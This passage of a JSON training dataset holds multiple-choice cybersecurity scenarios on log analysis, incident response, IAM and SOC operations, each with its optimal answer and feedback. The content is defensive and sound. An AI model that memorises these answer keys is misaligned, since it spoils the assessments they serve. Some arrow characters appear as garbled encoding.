resilience improvement for Chicago?", "options": [{"id": "A", "text": "Add second generator for N+1 redundancy", "is_optimal": false, "feedback": "{'short': \"N+1 generators help but doesn't address fuel issue\", 'detailed': \"N+1 generator redundancy protects against generator failure but doesn't help if fuel runs out - both generators run out of fuel at the same time. The root cause was fuel exhaustion, not generator failure. Address the fuel issue first.\", 'consequence': 'Still run out of fuel during extended outage.'}"}, {"id": "B", "text": "Increase fuel storage capacity and secure priority fuel delivery contract", "is_optimal": true, "feedback": "{'short': 'Correct! Addresses the root cause of the outage', 'detailed': 'The outage was caused by fuel exhaustion. Solution: increase on-site fuel capacity (48-72 hours minimum), secure priority fuel delivery contract with guaranteed response time regardless of conditions, and maintain minimum fuel levels. This directly addresses what caused the failure.', 'consequence': 'Extended runtime on generator. Priority fuel delivery ensures replenishment.'}"}, {"id": "C", "text": "Install dual utility feeds from different substations", "is_optimal": false, "feedback": "{'short': \"Helps but doesn't address generator fuel issue\", 'detailed': \"Dual utility feeds reduce the chance of utility outage (substations can fail independently). However, in a regional grid failure (like the heat wave), both feeds may lose power. Generators with adequate fuel remain essential. Dual feed is valuable but doesn't solve the fuel problem.\", 'consequence': 'Better utility resilience but same generator fuel gap.'}"}, {"id": "D", "text": "Migrate critical systems to cloud to reduce on-premises dependency", "is_optimal": false, "feedback": "{'short': \"Valid strategy but doesn't address existing site\", 'detailed': 'Cloud migration reduces on-premises dependency long-term. But Continental still needs the Chicago site operational, and cloud migration takes time. Fixing the fuel issue is immediate and addresses the specific root cause. Both are needed - fix fuel now, migrate over time.', 'consequence': \"Cloud helps long-term but doesn't fix immediate Chicago vulnerability.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D4-REM-001", "domain": 4, "type": "REM", "title": "Log Analysis Fundamentals", "difficulty": "foundational", "role": "Security Analyst", "organization": {"name": "Organization"}, "introduction": "['Understanding different log types and their security value', 'SIEM correlation and alert interpretation', 'Reading and interpreting log entries', 'Identifying indicators of compromise in logs']", "decision_points": [{"id": "decision_1", "title": "Log Type Selection", "situation": "You're investigating a potential unauthorized access. A user claims their account was compromised and someone accessed company files. You need to find evidence of the unauthorized access.", "question": "Which log type is MOST important for investigating unauthorized account access?", "options": [{"id": "A", "text": "Firewall logs - to see network connections", "is_optimal": false, "feedback": "{'short': 'Firewall logs show network traffic but not account usage', 'detailed': 'Firewall logs show what IPs connected but not which account was used or what they accessed. For account compromise, you need to see authentication events and access patterns tied to the user account.'}"}, {"id": "B", "text": "Authentication logs - to see login activity for the account", "is_optimal": true, "feedback": "{'short': 'Correct! Authentication logs show account usage patterns', 'detailed': \"Authentication logs show: when the account logged in, from where (source IP), success/failure, and what systems were accessed. This directly answers 'was the account used by someone other than the owner?' Look for logins from unusual locations or times.\"}"}, {"id": "C", "text": "Application logs - to see what applications were used", "is_optimal": false, "feedback": "{'short': 'Application logs are useful but authentication comes first', 'detailed': 'Application logs might show what the attacker did once logged in, but you first need to establish that unauthorized access occurred. Start with authentication to prove the compromise, then use application logs to understand the impact.'}"}, {"id": "D", "text": "System logs - to see system events", "is_optimal": false, "feedback": "{'short': 'System logs have limited visibility into account usage', 'detailed': 'System logs show system-level events but have limited information about user authentication and access patterns. Authentication logs are purpose-built for tracking account usage.'}"}]}, {"id": "decision_2", "title": "SIEM Alert Interpretation", "situation": "Your SIEM generates an alert: 'Brute Force Detected - Account: jsmith - 47 failed logins in 3 minutes from IP 185.220.101.X followed by successful login.'", "question": "What does this SIEM alert indicate?", "options": [{"id": "A", "text": "A user forgot their password and tried multiple times", "is_optimal": false, "feedback": "{'short': '47 attempts in 3 minutes is too fast for manual typing', 'detailed': 'A human typing passwords wrong would take much longer than 47 attempts in 3 minutes. This pace indicates automated attack tools. Additionally, the external IP (185.220.101.X is a Tor exit node pattern) suggests external attacker, not the legitimate user.'}"}, {"id": "B", "text": "Likely credential stuffing or brute force attack that succeeded", "is_optimal": true, "feedback": "{'short': 'Correct! High-speed attempts from external IP + success = account compromised', 'detailed': 'This pattern indicates: automated attack (speed of attempts), external source (suspicious IP), and success (attacker found valid credentials). The account is likely compromised. Immediate actions: disable the account, investigate what the attacker accessed, determine if credentials were reused elsewhere.'}"}, {"id": "C", "text": "A false positive - failed logins happen all the time", "is_optimal": false, "feedback": "{'short': 'The pattern strongly indicates an attack', 'detailed': \"Individual failed logins might be benign, but SIEM correlation identified the pattern: 47 failures in 3 minutes followed by success. This is the signature of a successful brute force attack. The SIEM's value is detecting these patterns.\"}"}, {"id": "D", "text": "A misconfigured application trying to authenticate", "is_optimal": false, "feedback": "{'short': 'Misconfigured apps usually fail consistently, not succeed after many failures', 'detailed': \"Misconfigured applications typically either succeed or fail consistently with the same wrong password. They don't try 47 different passwords and then succeed - that's password guessing behavior.\"}"}]}, {"id": "decision_3", "title": "Windows Event Analysis", "situation": "You're reviewing Windows Security logs and see this sequence on a workstation:\n- 4624 (Logon) - User: SYSTEM\n- 4688 (Process Create) - powershell.exe spawned by winword.exe\n- 4688 (Process Create) - cmd.exe spawned by powershell.exe", "question": "What does this log sequence indicate?", "options": [{"id": "A", "text": "Normal Office activity - Word can use PowerShell for macros", "is_optimal": false, "feedback": "{'short': 'Word spawning PowerShell is a major red flag', 'detailed': 'While technically possible, Word spawning PowerShell is the classic pattern for malicious macro execution. Legitimate Office macros rarely need PowerShell, and the chain Word \u00e2\u2020\u2019 PowerShell \u00e2\u2020\u2019 cmd is a common attack pattern. This should be investigated immediately.'}"}, {"id": "B", "text": "Likely malicious macro execution - classic attack pattern", "is_optimal": true, "feedback": "{'short': 'Correct! This is a textbook malware execution chain', 'detailed': 'This process tree (Word \u00e2\u2020\u2019 PowerShell \u00e2\u2020\u2019 cmd) is the signature of malicious macro execution: user opens malicious document, macro runs PowerShell for flexibility/evasion, PowerShell spawns cmd or downloads additional malware. This pattern should trigger immediate investigation and potential endpoint isolation.'}"}, {"id": "C", "text": "System maintenance task running", "is_optimal": false, "feedback": "{'short': \"System tasks don't run through Word\", 'detailed': 'System maintenance tasks would be spawned by system processes or scheduled tasks, not by Microsoft Word. The process parent (winword.exe) is the critical indicator here.'}"}, {"id": "D", "text": "User running a legitimate script from a document", "is_optimal": false, "feedback": "{'short': 'This pattern is malicious until proven otherwise', 'detailed': 'Even if a user intentionally ran a macro, Word spawning PowerShell spawning cmd is the exact pattern malware uses. Legitimate business processes rarely require this chain. Investigate as suspicious regardless of user intent.'}"}]}, {"id": "decision_4", "title": "Network IOC Detection", "situation": "DNS logs show a workstation making queries every 60 seconds to: xk7qm2.suspicious-domain.xyz. The domain was registered yesterday and resolves to an IP in Eastern Europe.", "question": "What does this DNS activity indicate?", "options": [{"id": "A", "text": "Normal web browsing activity", "is_optimal": false, "feedback": "{'short': \"Normal browsing doesn't query the same domain every 60 seconds\", 'detailed': 'Web browsing creates varied DNS queries as users visit different sites. Regular intervals to the same domain indicate automated behavior, not human browsing. The suspicious domain characteristics add to concern.'}"}, {"id": "B", "text": "Likely Command and Control (C2) beaconing", "is_optimal": true, "feedback": "{'short': 'Correct! Regular intervals + suspicious domain = C2 beaconing', 'detailed': 'C2 beaconing indicators: regular interval timing (every 60 seconds = automated), suspicious domain (random-looking subdomain, newly registered), unusual destination (Eastern Europe IP), and persistent connections. The malware is checking in with its controller. Investigate the workstation immediately.'}"}, {"id": "C", "text": "Software update check", "is_optimal": false, "feedback": "{'short': 'Legitimate update services use recognizable domains', 'detailed': 'Software update services use well-known domains (microsoft.com, adobe.com) not random-looking subdomains on newly registered domains. The domain characteristics indicate malicious infrastructure, not legitimate software.'}"}, {"id": "D", "text": "CDN caching activity", "is_optimal": false, "feedback": "{'short': 'CDNs use established, recognizable domains', 'detailed': 'CDN providers (Cloudflare, Akamai, etc.) use established domains. A random subdomain on a day-old domain is not CDN infrastructure. The domain age and name pattern indicate attacker infrastructure.'}"}]}, {"id": "decision_5", "title": "Log Correlation Challenge", "situation": "You have three events from different logs around the same time:\n1. VPN log: Successful login for admin account from unusual country\n2. AD log: Admin account added to Domain Admins group\n3. EDR log: PsExec.exe executed on domain controller", "question": "What does correlating these three events reveal?", "options": [{"id": "A", "text": "Routine administrative activity", "is_optimal": false, "feedback": "{'short': 'The unusual country login makes this suspicious', 'detailed': 'Each event alone might be normal, but: VPN from unusual country (suspicious), followed by privilege escalation (adding to Domain Admins), followed by lateral movement tool (PsExec on DC) is an attack chain. Correlating events reveals the full attack.'}"}, {"id": "B", "text": "Active attack - credential compromise, privilege escalation, lateral movement", "is_optimal": true, "feedback": "{'short': 'Correct! Correlation reveals the attack chain', 'detailed': \"Correlating these events shows: Initial Access (VPN login from unusual location = compromised credentials), Privilege Escalation (added to Domain Admins = attacker elevating), and Lateral Movement (PsExec on DC = attacker spreading). This is an active attack requiring immediate response. Each event alone might be missed; together they're clearly malicious.\"}"}, {"id": "C", "text": "Software deployment activity", "is_optimal": false, "feedback": "{'short': \"Software deployment doesn't require adding accounts to Domain Admins\", 'detailed': 'Legitimate software deployment would use existing service accounts with appropriate permissions, not: login from unusual country, add to Domain Admins, then use PsExec. The sequence shows an attacker building access.'}"}, {"id": "D", "text": "VPN connectivity test", "is_optimal": false, "feedback": "{'short': \"VPN tests don't involve privilege escalation and DC access\", 'detailed': \"A VPN test would be a login and perhaps basic connectivity verification. It wouldn't involve modifying group memberships or executing tools on domain controllers. The full sequence is clearly malicious.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D4-REM-002", "domain": 4, "type": "REM", "title": "Incident Response Basics", "difficulty": "foundational", "role": "Security Analyst", "organization": {"name": "Organization"}, "introduction": "['Understanding the incident response lifecycle phases', 'Knowing when and how to contain threats', 'Evidence handling and order of volatility', 'Communication and escalation during incidents']", "decision_points": [{"id": "decision_1", "title": "Active Incident Response", "situation": "You receive an alert: ransomware is actively encrypting files on a server. The encryption started 10 minutes ago and is spreading. You can see files being encrypted in real-time.", "question": "What should be your FIRST action?", "options": [{"id": "A", "text": "Begin forensic imaging of the server", "is_optimal": false, "feedback": "{'short': 'Forensics can wait - the attack is active', 'detailed': 'While evidence is important, forensic imaging takes hours. During that time, more files are being encrypted. Stop the active damage first, then collect evidence. The server is creating its own logs of the encryption that will be available after containment.'}"}, {"id": "B", "text": "Isolate the server from the network immediately", "is_optimal": true, "feedback": "{'short': 'Correct! Stop the spread, then investigate', 'detailed': \"With active encryption, the priority is stopping further damage. Network isolation: stops ransomware from spreading to other systems, may stop encryption if it requires C2 communication, and preserves the server's state for investigation. You'll still have the encrypted files, memory, and logs after isolation.\"}"}, {"id": "C", "text": "Call a team meeting to discuss response options", "is_optimal": false, "feedback": "{'short': 'No time for meetings during active attack', 'detailed': 'Every minute of meeting is more files encrypted. Active attacks require immediate action. Isolate first to stop damage, then coordinate. You can discuss next steps after immediate containment.'}"}, {"id": "D", "text": "Shut down the server completely", "is_optimal": false, "feedback": "{'short': 'Stops encryption but loses volatile evidence', 'detailed': 'Shutdown stops the ransomware but: loses memory contents (might contain encryption keys), loses running process information, and may corrupt partially encrypted files. Network isolation stops spread while preserving more evidence.'}"}]}, {"id": "decision_2", "title": "Evidence Collection Priority", "situation": "After containing the ransomware, you need to collect evidence. The server is isolated but still running. You have limited time before you need to begin recovery.", "question": "What evidence should you collect FIRST?", "options": [{"id": "A", "text": "Memory dump - capture RAM contents", "is_optimal": true, "feedback": "{'short': 'Correct! Memory is most volatile - collect first', 'detailed': \"Memory contents are lost on reboot or shutdown. Memory may contain: the running malware, encryption keys (possibly allowing decryption), network connections, and attacker commands. Disk contents will persist - memory won't. Order of volatility: most volatile first.\"}"}, {"id": "B", "text": "Disk image - copy the entire hard drive", "is_optimal": false, "feedback": "{'short': 'Important but disk is persistent - memory is more urgent', 'detailed': 'Disk imaging is important but disk contents persist. Memory is lost on power-off. Collect memory first, then disk image. You might even find encryption keys in memory that help recovery.'}"}, {"id": "C", "text": "Ransom note screenshot - document the demand", "is_optimal": false, "feedback": "{'short': \"The ransom note is a file on disk - it won't disappear\", 'detailed': \"The ransom note is saved to disk and will be there when you image the drive. It's not volatile evidence. Memory contents, which may contain crucial forensic data, should come first.\"}"}, {"id": "D", "text": "Network logs from the firewall", "is_optimal": false, "feedback": "{'short': 'Important but firewall logs are typically retained', 'detailed': \"Firewall logs are stored centrally and usually have retention periods. They're less volatile than the server's memory. Collect from the compromised server first, then gather supporting logs from network devices.\"}"}]}, {"id": "decision_3", "title": "Containment Decision", "situation": "During investigation, you discover the attacker used a compromised user account (jsmith) to access the server. The account has legitimate access to multiple systems. The attacker may still have the credentials.", "question": "What is the MOST appropriate containment action for the compromised account?", "options": [{"id": "A", "text": "Monitor the account to see what else the attacker accesses", "is_optimal": false, "feedback": "{'short': 'Too risky - attacker can cause more damage', 'detailed': \"While observing attacker activity can provide intelligence, the attacker has already deployed ransomware. Continued access risks additional damage. The investigation value doesn't outweigh the damage risk in this case.\"}"}, {"id": "B", "text": "Disable the account and reset the password immediately", "is_optimal": true, "feedback": "{'short': \"Correct! Remove attacker's access immediately\", 'detailed': 'Disabling the account: immediately prevents the attacker from using it again, is fast and reversible (low impact if wrong), and is the standard containment for compromised credentials. Reset the password too in case attacker tries to re-enable. Inform jsmith separately about the incident.'}"}, {"id": "C", "text": "Email the user to change their password", "is_optimal": false, "feedback": "{'short': 'Too slow and attacker might intercept', 'detailed': 'Asking the user to change their password: takes time (user might not see email immediately), attacker might intercept the email, and user might choose a weak password. Security team should force the credential change.'}"}, {"id": "D", "text": "Wait until after the investigation to change anything", "is_optimal": false, "feedback": "{'short': 'Leaves attacker with access during investigation', 'detailed': 'Investigation can take days or weeks. Leaving the attacker with valid credentials during that time is unacceptable risk. Contain the credential compromise immediately; you can still investigate how it was compromised.'}"}]}, {"id": "decision_4", "title": "Escalation and Communication", "situation": "The ransomware has encrypted critical business data including customer financial records. Your initial assessment suggests customer data was likely accessed. It's 2 AM and you're the only responder currently engaged.", "question": "Who should you notify FIRST?", "options": [{"id": "A", "text": "Customers whose data may be affected", "is_optimal": false, "feedback": "{'short': 'Too early and requires legal guidance', 'detailed': \"Customer notification is important but: you don't yet know the full scope, notification requirements have legal implications, and premature notification can cause unnecessary panic. Legal counsel should guide customer notification timing and content.\"}"}, {"id": "B", "text": "Your incident response lead/manager for escalation", "is_optimal": true, "feedback": "{'short': 'Correct! Escalate to get appropriate resources and authority', 'detailed': \"Escalate to your IR lead: they can activate additional responders, have authority to make containment decisions, know who else needs to be notified (legal, executives), and can coordinate the broader response. Don't try to handle a major incident alone - escalate to get help.\"}"}, {"id": "C", "text": "The FBI to report the ransomware", "is_optimal": false, "feedback": "{'short': 'Important but internal escalation comes first', 'detailed': \"Law enforcement notification is valuable but: your organization should decide through proper channels when to involve them, legal counsel may want to guide that conversation, and the FBI won't help with immediate containment. Internal escalation first.\"}"}, {"id": "D", "text": "No one until morning - avoid waking people at 2 AM", "is_optimal": false, "feedback": "{'short': 'Major incidents require immediate escalation', 'detailed': \"Customer data breach + ransomware is a major incident requiring immediate executive awareness and potentially regulatory notification. Waiting until morning delays critical decisions and may violate notification requirements. Wake people up - that's what IR plans are for.\"}"}]}, {"id": "decision_5", "title": "Post-Incident Activity", "situation": "The incident is resolved - systems are restored, credentials reset, and monitoring is enhanced. Management asks what the team should do next to prevent recurrence.", "question": "What is the MOST important post-incident activity?", "options": [{"id": "A", "text": "Identify and terminate the employee who clicked the phishing link", "is_optimal": false, "feedback": "{'short': 'Blame-focused approach prevents learning', 'detailed': \"Focusing on blaming individuals: discourages reporting of security issues, doesn't address systemic problems (why did phishing succeed?), and creates a culture of fear. The question is 'why did our controls fail?' not 'who do we blame?'\"}"}, {"id": "B", "text": "Conduct a blameless lessons learned review and implement improvements", "is_optimal": true, "feedback": "{'short': 'Correct! Learn from incidents to prevent recurrence', 'detailed': \"Lessons learned review: document what happened (timeline, actions taken), identify what worked and what didn't (detection, response, communication), find systemic improvements (better controls, training, procedures), assign owners and track improvements, and share lessons (without blame). This turns a negative event into security improvement.\"}"}, {"id": "C", "text": "Move on - the incident is over", "is_optimal": false, "feedback": "{'short': 'Misses the learning opportunity', 'detailed': \"Without lessons learned, you'll repeat mistakes. The same vulnerability, gap, or process failure that enabled this incident may enable the next one. Every incident is a learning opportunity - don't waste it.\"}"}, {"id": "D", "text": "Purchase more security tools", "is_optimal": false, "feedback": "{'short': \"Tools aren't always the answer\", 'detailed': 'The failure may have been process, training, or configuration - not lack of tools. Lessons learned should identify what actually failed. Sometimes tools are the answer, but that determination comes from analysis, not assumption.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D4-REM-003", "domain": 4, "type": "REM", "title": "IAM Concepts", "difficulty": "foundational", "role": "Security Analyst", "organization": {"name": "Organization"}, "introduction": "['Understanding the identity lifecycle (joiner, mover, leaver)', 'Authentication factors and MFA concepts', 'Privileged access management principles', 'Access control models and least privilege']", "decision_points": [{"id": "decision_1", "title": "Deprovisioning Priority", "situation": "An employee was terminated this morning for cause. They're upset and have already left the building. HR informs you about the termination via email.", "question": "What is the MOST urgent action regarding this user's access?", "options": [{"id": "A", "text": "Schedule account deletion for next week's maintenance window", "is_optimal": false, "feedback": "{'short': 'Far too slow for a hostile termination', 'detailed': 'A terminated employee who is upset poses immediate risk. Waiting until next week gives them days to access systems and potentially cause damage or steal data. Deprovisioning must be immediate.'}"}, {"id": "B", "text": "Disable all accounts and revoke access immediately", "is_optimal": true, "feedback": "{'short': 'Correct! Immediate deprovisioning for terminated users', 'detailed': 'Immediate actions: disable AD account (prevents new logins), revoke VPN access, disable email, revoke application access. The user left upset - they may try to access systems remotely. Every minute of delay is risk. This should be automated when possible.'}"}, {"id": "C", "text": "Wait for the standard HR termination process to complete", "is_optimal": false, "feedback": "{'short': 'Standard process is too slow for security risk', 'detailed': 'Standard HR processes might take days. For a hostile termination, security needs override standard timelines. IT should have an expedited process for immediate deprovisioning when security risk exists.'}"}, {"id": "D", "text": "Just change their password - they can keep the account for reference", "is_optimal": false, "feedback": "{'short': 'Password change alone is insufficient', 'detailed': \"Password change doesn't revoke existing sessions, doesn't disable email, doesn't revoke application access, and doesn't prevent them from resetting password if they have access to password reset. Full account disable is required.\"}"}]}, {"id": "decision_2", "title": "MFA Configuration", "situation": "You're implementing MFA for remote access. Users currently authenticate with username and password only. You need to add a second factor.", "question": "Which MFA configuration provides the STRONGEST security improvement?", "options": [{"id": "A", "text": "Add a second password that users must also enter", "is_optimal": false, "feedback": "{'short': 'Two passwords are not MFA', 'detailed': \"Two passwords are both 'something you know' - the same factor type. MFA requires different factor types. Two passwords can both be phished, stolen, or guessed. This provides minimal security improvement.\"}"}, {"id": "B", "text": "Add SMS text message codes as second factor", "is_optimal": false, "feedback": "{'short': 'Better than nothing but SMS has weaknesses', 'detailed': \"SMS is a true second factor (something you have - the phone), but: SMS can be intercepted via SIM swapping attacks, SMS can be redirected by attackers, and cell networks have vulnerabilities. It's better than password-only but not the strongest option.\"}"}, {"id": "C", "text": "Add authenticator app (TOTP) codes as second factor", "is_optimal": true, "feedback": "{'short': 'Correct! Authenticator apps are more secure than SMS', 'detailed': \"Authenticator apps (Google Authenticator, Microsoft Authenticator): generate codes on the device (not transmitted via SMS), can't be intercepted via SIM swap, work offline, and are a true 'something you have' factor. This is the standard recommendation for most MFA implementations.\"}"}, {"id": "D", "text": "Add security questions as second factor", "is_optimal": false, "feedback": "{'short': \"Security questions are 'something you know' - same as password\", 'detailed': 'Security questions are knowledge-based - the same factor type as password. Answers can often be researched on social media or guessed. This is not true MFA and provides minimal additional security.'}"}]}, {"id": "decision_3", "title": "Privileged Account Management", "situation": "The IT team shares one administrator account with the password written on a sticky note on the server room wall. When something breaks, any available admin logs in and fixes it.", "question": "What is the PRIMARY security problem with this approach?", "options": [{"id": "A", "text": "The sticky note could fall off the wall", "is_optimal": false, "feedback": "{'short': 'Physical security is a problem, but not the primary one', 'detailed': 'The sticky note is bad, but even if the password were memorized, shared admin accounts are a fundamental security problem. The password visibility is a symptom, not the root cause.'}"}, {"id": "B", "text": "No accountability - impossible to know who did what", "is_optimal": true, "feedback": "{'short': 'Correct! Shared accounts eliminate individual accountability', 'detailed': \"With shared accounts: no audit trail of individual actions (logs show 'admin' did it, not who), no accountability for mistakes or malicious actions, impossible to investigate incidents, and violates compliance requirements. Each admin should have their own admin account with their activity logged.\"}"}, {"id": "C", "text": "Too many people know the password", "is_optimal": false, "feedback": "{'short': 'Part of the problem but not the primary issue', 'detailed': \"Multiple people knowing the password increases exposure, but even if only two people knew it, you still couldn't determine which one performed an action. Individual accounts solve both the exposure and accountability problems.\"}"}, {"id": "D", "text": "The password should be more complex", "is_optimal": false, "feedback": "{'short': \"Password complexity doesn't address shared account issues\", 'detailed': \"A complex password on a shared account still has no accountability. Password complexity is good practice but doesn't solve the fundamental problem of not knowing who did what.\"}"}]}, {"id": "decision_4", "title": "Access Control Implementation", "situation": "A new employee joins the accounting team. They need access to the accounting system, email, and shared drives. You're setting up their access.", "question": "What is the BEST approach for granting this user access?", "options": [{"id": "A", "text": "Copy permissions from another accountant's account", "is_optimal": false, "feedback": "{'short': 'May copy inappropriate or excessive access', 'detailed': \"The other accountant may have accumulated extra permissions over time (privilege creep), may have access specific to their duties that the new person doesn't need, or may have incorrect access themselves. Copying propagates problems.\"}"}, {"id": "B", "text": "Assign the Accountant role which has pre-defined appropriate access", "is_optimal": true, "feedback": "{'short': 'Correct! Role-based access is consistent and manageable', 'detailed': \"RBAC approach: the Accountant role is pre-defined with appropriate permissions, all accountants get consistent access, changes to the role affect all members, and it's easy to audit who has what. New employee gets exactly what they need - no more, no less.\"}"}, {"id": "C", "text": "Give them full access and remove what they don't need later", "is_optimal": false, "feedback": "{'short': 'Violates least privilege - start with maximum access?', 'detailed': \"This inverts least privilege. Starting with full access: exposes them to data they shouldn't see initially, creates risk if they make mistakes with excess access, and 'removing later' rarely happens. Start with minimum needed.\"}"}, {"id": "D", "text": "Ask them what access they think they need", "is_optimal": false, "feedback": "{'short': \"New employees don't know what they need\", 'detailed': \"A new employee doesn't know your systems or what access is appropriate. They might ask for too much (everything sounds useful) or too little (don't know what exists). Access should be defined by the role requirements, not user requests.\"}"}]}, {"id": "decision_5", "title": "Access Review Finding", "situation": "During an access review, you find that a user who transferred from Accounting to Marketing six months ago still has full access to the accounting system including sensitive financial data.", "question": "What is this situation called and how should it be addressed?", "options": [{"id": "A", "text": "This is normal - they might need it as backup", "is_optimal": false, "feedback": "{'short': 'Keeping unnecessary access violates least privilege', 'detailed': \"Marketing doesn't need accounting access. Keeping 'just in case' access creates unnecessary risk. If they ever need temporary access, a proper request process exists. The access should be removed.\"}"}, {"id": "B", "text": "Privilege creep - revoke the accounting access immediately", "is_optimal": true, "feedback": "{'short': \"Correct! Remove access that's no longer needed\", 'detailed': 'Privilege creep: accumulation of access as users change roles without removing old permissions. This user has access to sensitive financial data they no longer need. Revoke the accounting access - they have no business need for it in their current role. This is exactly what access reviews are designed to catch.'}"}, {"id": "C", "text": "Ask the user if they still need the access", "is_optimal": false, "feedback": "{'short': 'Users will almost always say yes', 'detailed': \"Users tend to keep access 'just in case' or because removing it requires explanation. The review should be based on business need, not user preference. A marketing person has no business need for full accounting access.\"}"}, {"id": "D", "text": "Document it for next year's review", "is_optimal": false, "feedback": "{'short': 'Delays addressing a clear problem', 'detailed': 'The review found a problem - inappropriate access. Documenting for next year leaves the risk in place for another year. Reviews should result in action, not just documentation.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D4-SIM-001", "domain": 4, "type": "SIM", "title": "SOC Operations and Monitoring", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "Trident Financial Group"}, "introduction": "Trident Financial Group's SOC is drowning in alerts. Despite significant technology investments, critical incidents are being missed while analysts chase false positives. The board is concerned after learning that a data exfiltration was discovered by an external party rather than internal monitoring. As the new SOC Manager, you've been brought in to transform operations. David Chen has given you authority to restructure processes, tune systems, and implement best practices - but the clock is ticking on demonstrating improvement.", "decision_points": [{"id": "decision_1", "title": "Addressing Alert Fatigue", "situation": "Your analysts are overwhelmed - 15,000 alerts per day with a 94% false positive rate. Morale is low, and critical alerts are being missed in the noise. You need to take immediate action.", "question": "What is the MOST effective first step to address alert fatigue?", "options": [{"id": "A", "text": "Hire more analysts to handle the alert volume", "is_optimal": false, "feedback": "{'short': \"More analysts won't fix a 94% false positive rate\", 'detailed': \"Adding analysts to investigate false positives doesn't solve the problem - it just adds more people wasting time. At 94% false positive rate, you're asking analysts to find needles in a haystack. Fix the signal-to-noise ratio first, then right-size the team.\"}"}, {"id": "B", "text": "Implement systematic alert tuning starting with highest-volume false positive sources", "is_optimal": true, "feedback": "{'short': 'Correct! Reduce noise by tuning high-volume false positives', 'detailed': \"Alert tuning is the highest-impact first step. Analyze the top false positive generators, understand why they're firing incorrectly, and tune thresholds, add exclusions, or disable ineffective rules. Focus on high-volume sources first for maximum impact. A few weeks of focused tuning can dramatically improve signal-to-noise.\"}"}, {"id": "C", "text": "Replace the SIEM with a newer solution", "is_optimal": false, "feedback": "{'short': \"New tools won't fix process problems\", 'detailed': \"The SIEM (Splunk) is a capable tool - the problem is how it's configured and tuned. A new SIEM will have the same problems without proper tuning and processes. Fix the process first; consider tool changes later if needed.\"}"}, {"id": "D", "text": "Disable all medium and low severity alerts", "is_optimal": false, "feedback": "{'short': 'May eliminate valid detections along with noise', 'detailed': 'Blanket severity filtering is too blunt - some medium/low alerts may indicate real threats in context. Instead, tune individual rules based on their false positive rate and value. A well-tuned medium alert is better than a noisy critical alert.'}"}]}, {"id": "decision_2", "title": "Critical Log Source Gap", "situation": "Your log inventory reveals critical gaps - no DNS logging, no cloud visibility, and no database audit logs. These gaps explain why the cryptominer ran for 3 weeks undetected (DNS beaconing) and the data exfiltration was missed (database access).", "question": "Which log source should be prioritized FIRST for integration?", "options": [{"id": "A", "text": "Database audit logs - protect the crown jewels", "is_optimal": false, "feedback": "{'short': 'Important but not the highest-impact first choice', 'detailed': 'Database audit logs are valuable for detecting data access anomalies. However, DNS logging provides broader visibility across the entire attack chain - C2 communication, data exfiltration, and malware callbacks. DNS catches threats that database logs would miss.'}"}, {"id": "B", "text": "DNS logs - visibility into C2, exfiltration, and malware communication", "is_optimal": true, "feedback": "{'short': 'Correct! DNS provides broad visibility across the attack chain', 'detailed': \"DNS logging is often called the 'gold mine' of security monitoring. Almost all malware uses DNS for C2, exfiltration often uses DNS tunneling, and DNS queries reveal attacker infrastructure. The cryptominer used DNS beaconing - DNS logs would have detected it. High value, relatively easy to integrate.\"}"}, {"id": "C", "text": "Cloud logs - modern infrastructure requires cloud visibility", "is_optimal": false, "feedback": "{'short': 'Important if cloud usage is significant', 'detailed': 'Cloud logging is essential for organizations with significant cloud workloads. However, the immediate incidents (cryptominer, data exfiltration) occurred on-premises. DNS logging would have detected both. Prioritize based on where threats are manifesting.'}"}, {"id": "D", "text": "VPN logs - critical for remote access visibility", "is_optimal": false, "feedback": "{'short': 'Useful but more limited detection value', 'detailed': \"VPN logs show remote access patterns - useful for access anomaly detection. But VPN logs wouldn't have detected the cryptominer or data exfiltration, which occurred from internal systems. DNS has broader detection applicability.\"}"}]}, {"id": "decision_3", "title": "Triage Process Optimization", "situation": "Current process: Tier 1 analysts investigate every alert from scratch. Average investigation time is 12 minutes, but most of that time is spent gathering basic context that should be automated. Analysts report that 80% of their time is repetitive lookups.", "question": "What improvement will most significantly improve triage efficiency?", "options": [{"id": "A", "text": "Create detailed playbooks for every alert type", "is_optimal": false, "feedback": "{'short': \"Playbooks help but don't solve the repetitive lookup problem\", 'detailed': \"Playbooks standardize response but don't eliminate the manual lookups consuming 80% of analyst time. Playbooks tell analysts WHAT to look up; automation DOES the lookups. Combine playbooks with automation for maximum effect.\"}"}, {"id": "B", "text": "Automatic alert enrichment - add asset, user, and threat intel context to alerts", "is_optimal": true, "feedback": "{'short': 'Correct! Automate repetitive context gathering', 'detailed': 'Alert enrichment automatically adds context: asset information (criticality, owner, OS), user context (role, department, behavior baseline), threat intelligence (is IP/domain malicious?), and historical alerts. When an analyst opens an alert, context is already present. This eliminates 80% of repetitive lookups and lets analysts focus on analysis, not data gathering.'}"}, {"id": "C", "text": "Train Tier 1 analysts to investigate faster", "is_optimal": false, "feedback": "{'short': \"Training helps but doesn't eliminate waste\", 'detailed': 'Better-trained analysts still have to do the same manual lookups. Training improves quality and may marginally improve speed, but the fundamental inefficiency of manual context gathering remains. Automate the repetitive work.'}"}, {"id": "D", "text": "Skip Tier 1 - send all alerts directly to Tier 2", "is_optimal": false, "feedback": "{'short': 'Moves the problem without solving it', 'detailed': 'Tier 2 would face the same inefficiency issues. The tiered model exists for good reason - Tier 1 handles volume, Tier 2 handles complexity. Improve Tier 1 efficiency rather than eliminating the tier.'}"}]}, {"id": "decision_4", "title": "Threat Intelligence Integration", "situation": "Trident has purchased threat intelligence feeds but they're not well integrated. Analysts manually check indicators against external sources. The FS-ISAC membership provides valuable financial sector intelligence that's currently ignored.", "question": "How should threat intelligence be integrated into SOC operations?", "options": [{"id": "A", "text": "Create a separate threat intelligence team to analyze reports", "is_optimal": false, "feedback": "{'short': 'Separate team creates silos', 'detailed': \"A separate threat intel team without integration into operations means intelligence doesn't reach analysts when needed. Intelligence must be operationalized - integrated into detection, enrichment, and investigation workflows. Embed intelligence into SOC processes, not a separate team.\"}"}, {"id": "B", "text": "Automated IOC matching in SIEM plus analyst-accessible TIP for investigation", "is_optimal": true, "feedback": "{'short': 'Correct! Operationalize intelligence through automation and accessibility', 'detailed': 'Effective threat intel integration: automated matching (IOCs imported to SIEM watchlists for automatic detection and enrichment), accessible platform (Threat Intelligence Platform where analysts can search indicators during investigation), and contextual intelligence (FS-ISAC reports integrated into analyst briefings and detection engineering). Intelligence should be both automated AND accessible."}, {"id": "C", "text": "Send threat intelligence 